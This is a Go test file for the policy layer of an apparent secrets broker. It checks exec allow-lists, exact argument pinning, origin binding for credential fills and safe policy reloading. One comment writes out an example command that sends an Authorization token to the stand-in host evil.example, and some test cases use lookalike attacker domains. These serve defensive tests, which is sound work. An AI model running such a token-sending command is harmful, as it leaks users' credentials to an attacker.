package policy

import (
	"os"
	"path/filepath"
	"testing"
	"time"
)

func TestCheckDenyByDefault(t *testing.T) {
	s := NewEmpty()
	if s.Check("sec://x/y/password", "/bin/echo", nil) {
		t.Fatal("unknown ref must be denied")
	}
}

func TestCheckExecAllowList(t *testing.T) {
	s := NewEmpty()
	s.Upsert(ItemPolicy{Ref: "sec://x/y/password", Exec: []string{"/bin/echo"}})
	if !s.Check("sec://x/y/password", "/bin/echo", []string{"anything"}) {
		t.Fatal("allow-listed exec must pass when args are unconstrained")
	}
	if s.Check("sec://x/y/password", "/bin/cat", nil) {
		t.Fatal("non-allow-listed exec must be denied")
	}
}

// Args pins the child's argv[1:] exactly. Anything appended is a different
// command: `gh api --hostname github.com` is not `gh api --hostname
// github.com -H "Authorization: $TOKEN" https://evil.example`, and a prefix
// match would have allowed the second.
func TestCheckArgsExact(t *testing.T) {
	s := NewEmpty()
	s.Upsert(ItemPolicy{
		Ref:  "sec://x/y/password",
		Exec: []string{"/bin/echo"},
		Args: []string{"api", "--hostname", "github.com"},
	})
	ref, exe := "sec://x/y/password", "/bin/echo"

	cases := []struct {
		name string
		argv []string
		want bool
	}{
		{"exact match", []string{"api", "--hostname", "github.com"}, true},
		{"appended argument", []string{"api", "--hostname", "github.com", "/user"}, false},
		{"wrong value", []string{"api", "--hostname", "evil.example"}, false},
		{"reordered", []string{"--hostname", "github.com", "api"}, false},
		{"too short", []string{"api", "--hostname"}, false},
		{"empty argv", nil, false},
	}
	for _, c := range cases {
		if got := s.Check(ref, exe, c.argv); got != c.want {
			t.Errorf("%s: Check(%q) = %v, want %v", c.name, c.argv, got, c.want)
		}
	}
}

// A trailing "..." opts into prefix matching, for tools whose remaining
// arguments genuinely cannot be enumerated.
func TestCheckArgsEllipsisAllowsExtra(t *testing.T) {
	s := NewEmpty()
	s.Upsert(ItemPolicy{Ref: "r", Exec: []string{"/bin/echo"}, Args: []string{"api", "..."}})
	if !s.Check("r", "/bin/echo", []string{"api", "/user", "--jq", ".login"}) {
		t.Fatal("... must allow trailing arguments")
	}
	if !s.Check("r", "/bin/echo", []string{"api"}) {
		t.Fatal("... must allow the bare prefix too")
	}
	if s.Check("r", "/bin/echo", []string{"repo", "list"}) {
		t.Fatal("... must still enforce the fixed part")
	}
}

// Unconstrained policies keep working (backward compatibility with v0.1
// policy files), but doctor/allow surface them as unconstrained.
func TestCheckEmptyArgsIsUnconstrained(t *testing.T) {
	s := NewEmpty()
	s.Upsert(ItemPolicy{Ref: "r", Exec: []string{"/bin/echo"}})
	if !s.Check("r", "/bin/echo", []string{"whatever", "--x"}) {
		t.Fatal("empty Args must allow any argv")
	}
}

func TestLoadRoundTripsArgs(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "policy.json")
	body := `{"items":[{"ref":"r","exec":["/bin/echo"],"args":["api","--hostname","github.com"]}]}`
	if err := os.WriteFile(p, []byte(body), 0600); err != nil {
		t.Fatal(err)
	}
	s, err := Load(p)
	if err != nil {
		t.Fatal(err)
	}
	got, ok := s.Get("r")
	if !ok {
		t.Fatal("ref not loaded")
	}
	if len(got.Args) != 3 || got.Args[0] != "api" {
		t.Fatalf("args not round-tripped: %#v", got.Args)
	}
	if s.Check("r", "/bin/echo", []string{"api", "--hostname", "evil.example"}) {
		t.Fatal("loaded args constraint not enforced")
	}
	if s.Check("r", "/bin/echo", []string{"api", "--hostname", "github.com", "extra"}) {
		t.Fatal("loaded constraint must be exact, not a prefix")
	}
}

// PathSafe: an exec path the agent's own uid can replace is not a boundary.
func TestPathSafe(t *testing.T) {
	dir := t.TempDir() // owned by the test user, mode 0700
	f := filepath.Join(dir, "fake-gh")
	if err := os.WriteFile(f, []byte("#!/bin/sh\n"), 0755); err != nil {
		t.Fatal(err)
	}
	if ok, _ := PathSafe(f); ok {
		t.Fatal("a user-owned binary in a user-owned dir must be reported unsafe")
	}
	if ok, why := PathSafe("/bin/sh"); !ok {
		t.Fatalf("/bin/sh is root-owned and not group-writable, got unsafe: %s", why)
	}
	if ok, _ := PathSafe(filepath.Join(dir, "missing")); ok {
		t.Fatal("missing path must be unsafe")
	}
}

func TestIsInterpreter(t *testing.T) {
	for _, p := range []string{"/bin/sh", "/bin/bash", "/usr/bin/env", "/opt/homebrew/bin/python3.11", "/usr/bin/perl"} {
		if !IsInterpreter(p) {
			t.Errorf("%s should be flagged as an interpreter", p)
		}
	}
	for _, p := range []string{"/usr/bin/gh", "/usr/local/bin/aws"} {
		if IsInterpreter(p) {
			t.Errorf("%s should not be flagged", p)
		}
	}
}

// The daemon reads the policy file once at startup unless it notices the file
// changing: `sb allow` edits had no effect until a restart, which is both
// surprising and dangerous (an operator believes a rule is in force when it
// is not).
func TestReloadIfChanged(t *testing.T) {
	path := filepath.Join(t.TempDir(), "policy.json")
	write := func(body string) {
		if err := os.WriteFile(path, []byte(body), 0600); err != nil {
			t.Fatal(err)
		}
	}
	write(`{"items":[]}`)

	s, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if s.Check("r", "/bin/echo", nil) {
		t.Fatal("empty policy must deny")
	}

	write(`{"items":[{"ref":"r","exec":["/bin/echo"],"args":["hi"]}]}`)
	os.Chtimes(path, time.Now().Add(time.Second), time.Now().Add(time.Second))
	if err := s.ReloadIfChanged(); err != nil {
		t.Fatal(err)
	}
	if !s.Check("r", "/bin/echo", []string{"hi"}) {
		t.Fatal("policy added on disk was not picked up")
	}

	// A removed rule must stop applying, not linger in memory.
	write(`{"items":[]}`)
	os.Chtimes(path, time.Now().Add(2*time.Second), time.Now().Add(2*time.Second))
	if err := s.ReloadIfChanged(); err != nil {
		t.Fatal(err)
	}
	if s.Check("r", "/bin/echo", []string{"hi"}) {
		t.Fatal("revoked policy is still in force")
	}
}

// A truncated or unparseable file (sb rewrites the file in place) must leave
// the last good policy in force rather than failing open or wiping the rules.
func TestReloadKeepsLastGoodOnBadFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "policy.json")
	os.WriteFile(path, []byte(`{"items":[{"ref":"r","exec":["/bin/echo"]}]}`), 0600)
	s, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	os.WriteFile(path, []byte(`{"items":[{"ref":`), 0600) // mid-write
	os.Chtimes(path, time.Now().Add(time.Second), time.Now().Add(time.Second))
	if err := s.ReloadIfChanged(); err == nil {
		t.Fatal("a corrupt policy file should report an error")
	}
	if !s.Check("r", "/bin/echo", nil) {
		t.Fatal("last good policy must stay in force")
	}
}

// Host binds a secret to a web origin, the browser equivalent of the exec
// allow-list: the credential for mail.proton.me must not be fillable into a
// login form on evil.example.
func TestCheckHost(t *testing.T) {
	s := NewEmpty()
	s.Upsert(ItemPolicy{Ref: "r", Host: []string{"https://mail.proton.me"}})

	cases := []struct {
		url  string
		want bool
	}{
		{"https://mail.proton.me", true},
		{"https://mail.proton.me/u/0/inbox?x=1", true}, // path and query are irrelevant
		{"https://MAIL.PROTON.ME/login", true},         // host is case-insensitive
		{"https://evil.example", false},
		{"https://mail.proton.me.evil.example", false}, // suffix trick
		{"http://mail.proton.me", false},               // scheme must match
		{"https://proton.me", false},                   // parent domain is a different origin
		{"https://mail.proton.me:8443", false},         // explicit port is a different origin
		{"not a url", false},
		{"", false},
	}
	for _, c := range cases {
		if got := s.CheckHost("r", c.url); got != c.want {
			t.Errorf("CheckHost(%q) = %v, want %v", c.url, got, c.want)
		}
	}
}

func TestCheckHostDeniesWhenUnset(t *testing.T) {
	s := NewEmpty()
	// a ref bound only to an executable must not be fillable into any page
	s.Upsert(ItemPolicy{Ref: "r", Exec: []string{"/usr/bin/gh"}})
	if s.CheckHost("r", "https://github.com") {
		t.Fatal("a ref with no host binding must deny every origin")
	}
	if s.CheckHost("unknown", "https://github.com") {
		t.Fatal("unknown ref must deny")
	}
}

func TestRefsForSite(t *testing.T) {
	s := NewEmpty()
	s.Upsert(ItemPolicy{Ref: "mail", Host: []string{"https://mail.proton.me"}})
	s.Upsert(ItemPolicy{Ref: "also-mail", Host: []string{"https://mail.proton.me", "https://account.proton.me"}})
	s.Upsert(ItemPolicy{Ref: "gh", Host: []string{"https://github.com"}})
	s.Upsert(ItemPolicy{Ref: "cli-only", Exec: []string{"/usr/bin/gh"}})

	got := s.RefsForSite("https://mail.proton.me/inbox")
	if len(got) != 2 {
		t.Fatalf("expected 2 refs for proton mail, got %v", got)
	}
	if len(s.RefsForSite("https://evil.example")) != 0 {
		t.Fatal("no refs should match an unbound origin")
	}
}

// A ref that requires approval must be withheld from browser fills (nothing
// in that path can prompt), and agent-scoped browsers only see refs that were
// explicitly marked for them.
func TestBrowserFacingFlags(t *testing.T) {
	s := NewEmpty()
	s.Upsert(ItemPolicy{Ref: "gated", Host: []string{"https://x.example"}, Approve: true})
	s.Upsert(ItemPolicy{Ref: "agent-ok", Host: []string{"https://x.example"}, AgentBrowser: true})
	s.Upsert(ItemPolicy{Ref: "human-only", Host: []string{"https://x.example"}})

	refs := s.RefsForSite("https://x.example")
	if len(refs) != 3 {
		t.Fatalf("policy lookup itself is origin-scoped only: %v", refs)
	}
	for _, c := range []struct {
		ref              string
		approve, agentOK bool
	}{
		{"gated", true, false},
		{"agent-ok", false, true},
		{"human-only", false, false},
	} {
		p, _ := s.Get(c.ref)
		if p.Approve != c.approve || p.AgentBrowser != c.agentOK {
			t.Errorf("%s: approve=%v agent_browser=%v", c.ref, p.Approve, p.AgentBrowser)
		}
	}
}

// Strict origin matching is the default, but real login flows cross
// subdomains (z.ai redirects to chat.z.ai), so a policy may opt in to a
// wildcard explicitly. It must never match the parent domain itself, a
// lookalike, or a different scheme.
func TestCheckHostWildcard(t *testing.T) {
	s := NewEmpty()
	s.Upsert(ItemPolicy{Ref: "r", Host: []string{"https://*.z.ai"}})
	cases := []struct {
		url  string
		want bool
	}{
		{"https://chat.z.ai", true},
		{"https://chat.z.ai/login?x=1", true},
		{"https://a.b.z.ai", true},
		{"https://CHAT.Z.AI", true},
		{"https://z.ai", false},     // the parent is a different origin
		{"https://evilz.ai", false}, // suffix must break on a label boundary
		{"https://z.ai.evil.example", false},
		{"http://chat.z.ai", false}, // scheme still matters
		{"https://chat.z.ai:8443", false},
	}
	for _, c := range cases {
		if got := s.CheckHost("r", c.url); got != c.want {
			t.Errorf("CheckHost(%q) = %v, want %v", c.url, got, c.want)
		}
	}
	// wildcard entries participate in site lookup too
	if refs := s.RefsForSite("https://chat.z.ai"); len(refs) != 1 {
		t.Fatalf("wildcard host should be discoverable for the site: %v", refs)
	}
}

// `sb allow <ref> <exec> --` with nothing after the separator means the child
// may run with no arguments at all — not with any arguments.
func TestNoArgsMeansNone(t *testing.T) {
	s := NewEmpty()
	s.Upsert(ItemPolicy{Ref: "r", Exec: []string{"/bin/echo"}, NoArgs: true})
	if !s.Check("r", "/bin/echo", nil) {
		t.Fatal("no arguments must be allowed")
	}
	if s.Check("r", "/bin/echo", []string{"anything"}) {
		t.Fatal("NoArgs must refuse every argument")
	}

	path := filepath.Join(t.TempDir(), "policy.json")
	os.WriteFile(path, []byte(`{"items":[{"ref":"r","exec":["/bin/echo"],"no_args":true}]}`), 0600)
	loaded, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if loaded.Check("r", "/bin/echo", []string{"x"}) {
		t.Fatal("no_args must survive a round trip through the policy file")
	}
}
